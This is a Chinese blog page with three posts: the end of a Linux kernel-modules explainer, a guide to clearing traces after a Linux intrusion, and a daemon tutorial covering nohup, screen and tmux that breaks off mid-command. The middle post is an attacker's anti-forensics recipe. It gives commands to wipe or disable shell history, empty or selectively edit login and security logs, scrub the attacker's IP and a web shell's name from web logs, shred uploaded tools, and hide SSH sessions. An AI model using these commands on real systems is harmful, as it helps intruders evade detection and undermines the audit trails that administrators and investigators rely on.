<h2 id="Linux内核体系结构"><a href="#Linux内核体系结构" class="headerlink" title="Linux内核体系结构"></a>Linux内核体系结构</h2><p>因为Linux内核是单片的，所以它比其他类型的内核占用空间最大，复杂度也最高。这是一个设计特性，在Linux早期引起了相当多的争论，并且仍然带有一些与单内核固有的相同的设计缺陷。 </p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-7557625/zlkayrh2oc.png"></p>
<p>为了解决这些缺陷，Linux内核开发人员所做的一件事就是使内核模块可以在运行时加载和卸载，这意味着您可以动态地添加或删除内核的特性。这不仅可以向内核添加硬件功能，还可以包括运行<a target="_blank" rel="noopener" href="https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065">服务器</a>进程的模块，比如低级别虚拟化，但也可以替换整个内核，而不需要在某些情况下重启计算机。 想象一下，如果您可以升级到Windows服务包，而不需要重新启动……</p>
<h2 id="内核模块"><a href="#内核模块" class="headerlink" title="内核模块"></a>内核模块</h2><p>如果Windows已经安装了所有可用的驱动程序，而您只需要打开所需的驱动程序怎么办?这本质上就是内核模块为Linux所做的。内核模块，也称为可加载内核模块(LKM)，对于保持内核在不消耗所有可用内存的情况下与所有硬件一起工作是必不可少的。</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-7557625/rrunv3db47.png"></p>
<p>模块通常向基本内核添加设备、文件系统和系统调用等功能。lkm的文件扩展名是.ko，通常存储在&#x2F;lib&#x2F;modules目录中。由于模块的特性，您可以通过在启动时使用menuconfig命令将模块设置为load或not load，或者通过编辑&#x2F;boot&#x2F;config文件，或者使用modprobe命令动态地加载和卸载模块，轻松定制内核。</p>
<p>第三方和封闭源码模块在一些发行版中是可用的，比如Ubuntu，默认情况下可能无法安装，因为这些模块的源代码是不可用的。该软件的开发人员(即nVidia、ATI等)不提供源代码，而是构建自己的模块并编译所需的.ko文件以便分发。虽然这些模块像beer一样是免费的，但它们不像speech那样是免费的，因此不包括在一些发行版中，因为维护人员认为它通过提供非免费软件“污染”了内核。</p>
<p>内核并不神奇，但对于任何正常运行的计算机来说，它都是必不可少的。Linux内核不同于OS X和Windows，因为它包含内核级别的驱动程序，并使许多东西“开箱即用”。希望您能对软件和硬件如何协同工作以及启动计算机所需的文件有更多的了解。</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-7557625/lbwq1w9ipe.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://qwq0qwq.github.io/2023/10/10/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QWQ0QWQ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/10/10/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/" class="post-title-link" itemprop="url">痕迹清理</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2023-10-10 18:47:15 / Modified: 18:48:32" itemprop="dateCreated datePublished" datetime="2023-10-10T18:47:15+08:00">2023-10-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Linux-入侵痕迹清理技巧"><a href="#Linux-入侵痕迹清理技巧" class="headerlink" title="Linux 入侵痕迹清理技巧"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13648156.html">Linux 入侵痕迹清理技巧</a></h1><p>在攻击结束后，如何不留痕迹的清除日志和操作记录，以掩盖入侵踪迹，这其实是一个细致的技术活。你所做的每一个操作，都要被抹掉；你所上传的工具，都应该被安全地删掉。</p>
<p><strong>01、清除history历史命令记录</strong></p>
<p>查看历史操作命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看历史操作命令：history</span><br><span class="line">history记录文件：more  ~/.bash_history</span><br></pre></td></tr></table></figure>

<p>第一种方式：</p>
<p>（1）编辑history记录文件，删除部分不想被保存的历史命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">vim ~/.bash_history</span><br></pre></td></tr></table></figure>

<p>（2）清除当前用户的history命令记录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">history -c</span><br></pre></td></tr></table></figure>

<p>第二种方式：</p>
<p>（1）利用vim特性删除历史命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#使用vim打开一个文件</span><br><span class="line">vi test.txt</span><br><span class="line"># 设置vim不记录命令，Vim会将命令历史记录，保存在viminfo文件中。</span><br><span class="line">:set history=0</span><br><span class="line"># 用vim的分屏功能打开命令记录文件.bash_history，编辑文件删除历史操作命令</span><br><span class="line">vsp ~/.bash_history</span><br><span class="line"># 清楚保存.bash_history文件即可。</span><br></pre></td></tr></table></figure>

<p>（2）在vim中执行自己不想让别人看到的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">:set history=0</span><br><span class="line">:!command</span><br></pre></td></tr></table></figure>

<p>第三种方式：</p>
<p>通过修改配置文件&#x2F;etc&#x2F;profile，使系统不再保存命令记录。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">HISTSIZE=0</span><br></pre></td></tr></table></figure>

<p>第四种方式：</p>
<p>登录后执行下面命令,不记录历史命令(.bash_history)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0</span><br></pre></td></tr></table></figure>

<p><strong>02、清除系统日志痕迹</strong></p>
<p>Linux 系统存在多种日志文件，来记录系统运行过程中产生的日志。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/var/log/btmp   记录所有登录失败信息，使用lastb命令查看</span><br><span class="line">/var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看</span><br><span class="line">/var/log/wtmp    记录所有用户的登录、注销信息，使用last命令查看</span><br><span class="line">/var/log/utmp    记录当前已经登录的用户信息，使用w,who,users等命令查看</span><br><span class="line">/var/log/secure   记录与安全相关的日志信息</span><br><span class="line">/var/log/message  记录系统启动后的信息和错误日志</span><br></pre></td></tr></table></figure>

<p>第一种方式：清空日志文件<br>清除登录系统失败的记录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@centos]# echo &gt; /var/log/btmp </span><br><span class="line">[root@centos]# lastb           //查询不到登录失败信息</span><br></pre></td></tr></table></figure>

<p>清除登录系统成功的记录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@centos]# echo &gt; /var/log/wtmp  </span><br><span class="line">[root@centos]# last              //查询不到登录成功的信息</span><br></pre></td></tr></table></figure>

<p>清除相关日志信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">清除用户最后一次登录时间：echo &gt; /var/log/lastlog          #lastlog命令</span><br><span class="line">清除当前登录用户的信息：echo &gt;   /var/log/utmp             #使用w,who,users等命令</span><br><span class="line">清除安全日志记录：cat /dev/null &gt;  /var/log/secure</span><br><span class="line">清除系统日志记录：cat /dev/null &gt;  /var/log/message</span><br></pre></td></tr></table></figure>

<p>第二种方式：删除&#x2F;替换部分日志</p>
<p>日志文件全部被清空，太容易被管理员察觉了，如果只是删除或替换部分关键日志信息，那么就可以完美隐藏攻击痕迹。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip</span><br><span class="line">sed  -i &#x27;/自己的ip/&#x27;d  /var/log/messages</span><br><span class="line"># 全局替换登录IP地址：</span><br><span class="line">sed -i &#x27;s/192.168.166.85/192.168.1.1/g&#x27; secure</span><br></pre></td></tr></table></figure>

<p><strong>03、清除web入侵痕迹</strong></p>
<p>第一种方式： 直接替换日志ip地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sed -i &#x27;s/192.168.166.85/192.168.1.1/g&#x27; access.log</span><br></pre></td></tr></table></figure>

<p>第二种方式：清除部分相关日志</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 使用grep -v来把我们的相关信息删除,</span><br><span class="line">cat /var/log/nginx/access.log | grep -v evil.php &gt; tmp.log</span><br><span class="line"># 把修改过的日志覆盖到原日志文件</span><br><span class="line">cat tmp.log &gt; /var/log/nginx/access.log/</span><br></pre></td></tr></table></figure>

<p><strong>04、文件安全删除工具</strong></p>
<p>（1）shred命令<br>实现安全的从硬盘上擦除数据，默认覆盖3次，通过 -n指定数据覆盖次数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@centos]# shred -f -u -z -v -n 8 1.txt </span><br><span class="line">shred: 1.txt: pass 1/9 (random)...</span><br><span class="line">shred: 1.txt: pass 2/9 (ffffff)...</span><br><span class="line">shred: 1.txt: pass 3/9 (aaaaaa)...</span><br><span class="line">shred: 1.txt: pass 4/9 (random)...</span><br><span class="line">shred: 1.txt: pass 5/9 (000000)...</span><br><span class="line">shred: 1.txt: pass 6/9 (random)...</span><br><span class="line">shred: 1.txt: pass 7/9 (555555)...</span><br><span class="line">shred: 1.txt: pass 8/9 (random)...</span><br><span class="line">shred: 1.txt: pass 9/9 (000000)...</span><br><span class="line">shred: 1.txt: removing</span><br><span class="line">shred: 1.txt: renamed to 00000</span><br><span class="line">shred: 00000: renamed to 0000</span><br><span class="line">shred: 0000: renamed to 000</span><br><span class="line">shred: 000: renamed to 00</span><br><span class="line">shred: 00: renamed to 0</span><br><span class="line">shred: 1.txt: removed</span><br></pre></td></tr></table></figure>

<p>（2）dd命令<br>可用于安全地清除硬盘或者分区的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dd if=/dev/zero of=要删除的文件 bs=大小 count=写入的次数</span><br></pre></td></tr></table></figure>

<p>（3）wipe<br>Wipe 使用特殊的模式来重复地写文件，从磁性介质中安全擦除文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">wipe filename</span><br></pre></td></tr></table></figure>

<p>（4）Secure-Delete<br>Secure-Delete 是一组工具集合，提供srm、smem、sfill、sswap，4个安全删除文件的命令行工具。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">srm filename</span><br><span class="line">sfill filename</span><br><span class="line">sswap /dev/sda1</span><br><span class="line">smem</span><br></pre></td></tr></table></figure>

<p><strong>05、隐藏远程SSH登陆记录</strong></p>
<p>隐身登录系统，不会被w、who、last等指令检测到。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh -T root@192.168.0.1 /bin/bash -i</span><br></pre></td></tr></table></figure>

<p>不记录ssh公钥在本地.ssh目录中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://qwq0qwq.github.io/2023/10/10/%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QWQ0QWQ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/10/10/%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B/" class="post-title-link" itemprop="url">守护进程</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2023-10-10 15:27:29 / Modified: 15:54:07" itemprop="dateCreated datePublished" datetime="2023-10-10T15:27:29+08:00">2023-10-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Linux-守护进程的启动方法"><a href="#Linux-守护进程的启动方法" class="headerlink" title="Linux 守护进程的启动方法"></a>Linux 守护进程的启动方法</h1><h2 id="一、问题的由来"><a href="#一、问题的由来" class="headerlink" title="一、问题的由来"></a>一、问题的由来</h2><p>Web应用写好后，下一件事就是启动，让它一直在后台运行。</p>
<p>这并不容易。举例来说，下面是一个最简单的Node应用<code>server.js</code>，只有6行。</p>
<blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"></span><br><span class="line">http.<span class="title function_">createServer</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span>&#125;);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">5000</span>);</span><br></pre></td></tr></table></figure>
</blockquote>
<p>你在命令行下启动它。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ node server.js</span><br></pre></td></tr></table></figure>
</blockquote>
<p>看上去一切正常，所有人都能快乐地访问 5000 端口了。但是，一旦你退出命令行窗口，这个应用就一起退出了，无法访问了。</p>
<p>怎么才能让它变成系统的守护进程（daemon），成为一种服务（service），一直在那里运行呢？</p>
<h2 id="二、前台任务与后台任务"><a href="#二、前台任务与后台任务" class="headerlink" title="二、前台任务与后台任务"></a>二、前台任务与后台任务</h2><p>上面这样启动的脚本，称为”前台任务”（foreground job）。它会独占命令行窗口，只有运行完了或者手动中止，才能执行其他命令。</p>
<p>变成守护进程的第一步，就是把它改成”后台任务”（background job）。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ node server.js &amp;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>只要在命令的尾部加上符号<code>&amp;</code>，启动的进程就会成为”后台任务”。如果要让正在运行的”前台任务”变为”后台任务”，可以先按<code>ctrl + z</code>，然后执行<code>bg</code>命令（让最近一个暂停的”后台任务”继续执行）。</p>
<p>“后台任务”有两个特点。</p>
<blockquote>
<ol>
<li>继承当前 session （对话）的标准输出（stdout）和标准错误（stderr）。因此，后台任务的所有输出依然会同步地在命令行下显示。</li>
<li>不再继承当前 session 的标准输入（stdin）。你无法向这个任务输入指令了。如果它试图读取标准输入，就会暂停执行（halt）。</li>
</ol>
</blockquote>
<p>可以看到，”后台任务”与”前台任务”的本质区别只有一个：是否继承标准输入。所以，执行后台任务的同时，用户还可以输入其他命令。</p>
<h2 id="三、SIGHUP信号"><a href="#三、SIGHUP信号" class="headerlink" title="三、SIGHUP信号"></a>三、SIGHUP信号</h2><p>变为”后台任务”后，一个进程是否就成为了守护进程呢？或者说，用户退出 session 以后，”后台任务”是否还会继续执行？</p>
<p>Linux系统是这样设计的。</p>
<blockquote>
<ol>
<li>用户准备退出 session</li>
<li>系统向该 session 发出<code>SIGHUP</code>信号</li>
<li>session 将<code>SIGHUP</code>信号发给所有子进程</li>
<li>子进程收到<code>SIGHUP</code>信号后，自动退出</li>
</ol>
</blockquote>
<p>上面的流程解释了，为什么”前台任务”会随着 session 的退出而退出：因为它收到了<code>SIGHUP</code>信号。</p>
<p>那么，”后台任务”是否也会收到<code>SIGHUP</code>信号？</p>
<p>这由 Shell 的<code>huponexit</code>参数决定的。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">shopt</span> | grep huponexit</span><br></pre></td></tr></table></figure>
</blockquote>
<p>执行上面的命令，就会看到<code>huponexit</code>参数的值。</p>
<p>大多数Linux系统，这个参数默认关闭（<code>off</code>）。因此，session 退出的时候，不会把<code>SIGHUP</code>信号发给”后台任务”。所以，一般来说，”后台任务”不会随着 session 一起退出。</p>
<h2 id="四、disown-命令"><a href="#四、disown-命令" class="headerlink" title="四、disown 命令"></a>四、disown 命令</h2><p>通过”后台任务”启动”守护进程”并不保险，因为有的系统的<code>huponexit</code>参数可能是打开的（<code>on</code>）。</p>
<p>更保险的方法是使用<code>disown</code>命令。它可以将指定任务从”后台任务”列表（<code>jobs</code>命令的返回结果）之中移除。一个”后台任务”只要不在这个列表之中，session 就肯定不会向它发出<code>SIGHUP</code>信号。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ node server.js &amp;</span><br><span class="line">$ <span class="built_in">disown</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>执行上面的命令以后，<code>server.js</code>进程就被移出了”后台任务”列表。你可以执行<code>jobs</code>命令验证，输出结果里面，不会有这个进程。</p>
<p><code>disown</code>的用法如下。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 移出最近一个正在执行的后台任务</span></span><br><span class="line">$ <span class="built_in">disown</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 移出所有正在执行的后台任务</span></span><br><span class="line">$ <span class="built_in">disown</span> -r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移出所有后台任务</span></span><br><span class="line">$ <span class="built_in">disown</span> -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不移出后台任务，但是让它们不会收到SIGHUP信号</span></span><br><span class="line">$ <span class="built_in">disown</span> -h</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据jobId，移出指定的后台任务</span></span><br><span class="line">$ <span class="built_in">disown</span> %2</span><br><span class="line">$ <span class="built_in">disown</span> -h %2</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="五、标准-I-O"><a href="#五、标准-I-O" class="headerlink" title="五、标准 I&#x2F;O"></a>五、标准 I&#x2F;O</h2><p>使用<code>disown</code>命令之后，还有一个问题。那就是，退出 session 以后，如果后台进程与标准I&#x2F;O有交互，它还是会挂掉。</p>
<p>还是以上面的脚本为例，现在加入一行。</p>
<blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"></span><br><span class="line">http.<span class="title function_">createServer</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;server starts...&#x27;</span>); <span class="comment">// 加入此行</span></span><br><span class="line">  res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span>&#125;);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">5000</span>);</span><br></pre></td></tr></table></figure>
</blockquote>
<p>启动上面的脚本，然后再执行<code>disown</code>命令。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ node server.js &amp;</span><br><span class="line">$ <span class="built_in">disown</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>接着，你退出 session，访问5000端口，就会发现连不上。</p>
<p>这是因为”后台任务”的标准 I&#x2F;O 继承自当前 session，<code>disown</code>命令并没有改变这一点。一旦”后台任务”读写标准 I&#x2F;O，就会发现它已经不存在了，所以就报错终止执行。</p>
<p>为了解决这个问题，需要对”后台任务”的标准 I&#x2F;O 进行重定向。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ node server.js &gt; stdout.txt 2&gt; stderr.txt &lt; /dev/null &amp;</span><br><span class="line">$ <span class="built_in">disown</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面这样执行，基本上就没有问题了。</p>
<h2 id="六、nohup-命令"><a href="#六、nohup-命令" class="headerlink" title="六、nohup 命令"></a>六、nohup 命令</h2><p>还有比<code>disown</code>更方便的命令，就是<code>nohup</code>。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">nohup</span> node server.js &amp;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><code>nohup</code>命令对<code>server.js</code>进程做了三件事。</p>
<blockquote>
<ul>
<li>阻止<code>SIGHUP</code>信号发到这个进程。</li>
<li>关闭标准输入。该进程不再能够接收任何输入，即使运行在前台。</li>
<li>重定向标准输出和标准错误到文件<code>nohup.out</code>。</li>
</ul>
</blockquote>
<p>也就是说，<code>nohup</code>命令实际上将子进程与它所在的 session 分离了。</p>
<p>注意，<code>nohup</code>命令不会自动把进程变为”后台任务”，所以必须加上<code>&amp;</code>符号。</p>
<h2 id="七、Screen-命令与-Tmux-命令"><a href="#七、Screen-命令与-Tmux-命令" class="headerlink" title="七、Screen 命令与 Tmux 命令"></a>七、Screen 命令与 Tmux 命令</h2><p>另一种思路是使用 terminal multiplexer （终端复用器：在同一个终端里面，管理多个session），典型的就是 <a target="_blank" rel="noopener" href="https://www.gnu.org/software/screen/">Screen</a> 命令和 <a target="_blank" rel="noopener" href="https://tmux.github.io/">Tmux</a> 命令。</p>
<p>它们可以在当前 session 里面，新建另一个 session。这样的话，当前 session 一旦结束，不影响其他 session。而且，以后重新登录，还可以再连上早先新建的 session。</p>
<p>Screen 的用法如下。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新建一个 session</span></span><br><span class="line">$ screen</span><br><span class="line">$ node server.js</span><br></pre></td></tr></table></figure>
</blockquote>
<p>然后，按下<code>ctrl + A</code>和<code>ctrl + D</code>，回到原来的 session，从那里退出登录。下次登录时，再切回去。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ screen -r</span><br></pre></td></tr></table></figure>
</blockquote>
<p>如果新建多个后台 session，就需要为它们指定名字。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ screen -S name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切回指定 session</span></span><br><span class="line">$ screen -r name</span><br><span class="line">$ screen -r pid_number</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有 session</span></span><br><span class="line">$ screen -<span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>如果要停掉某个 session，可以先切回它，然后按下<code>ctrl + c</code>和<code>ctrl + d</code>。</p>
<p>Tmux 比 Screen 功能更多、更强大，它的基本用法如下。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ tmux</span><br><span class="line">$ node server.js</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回原来的session</span></span><br><span class="line">$ tmux detach</span><br></pre></td></tr></table></figure>
</blockquote>
<p>除了<code>tmux detach</code>，另一种方法是按下<code>Ctrl + B</code>和<code>d</code> ，也可以回到原来的 session。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下次登录时，返回后台正在运行服务session</span></span><br><span class="line">$ tmux attach</span><br></pre></td></tr></table></figure>
</blockquote>
<p>如果新建多个 session，就需要为每个 session 指定名字。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新建 session</span></span><br><span class="line">$ tmux new -s session_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到指定 session</span></span><br><span class="line">$ tmux attach -t session_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有 session</span></span><br><span class="line">$ tmux list-sessions</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出当前 session，返回前一个 session </span></span><br><span class="line">$ tmux detach</span><br><span class="line"></span><br><span class="line"><span class="comment"># 杀死指定 session</span></span><br><span class="line">$ tmux kill-session -t 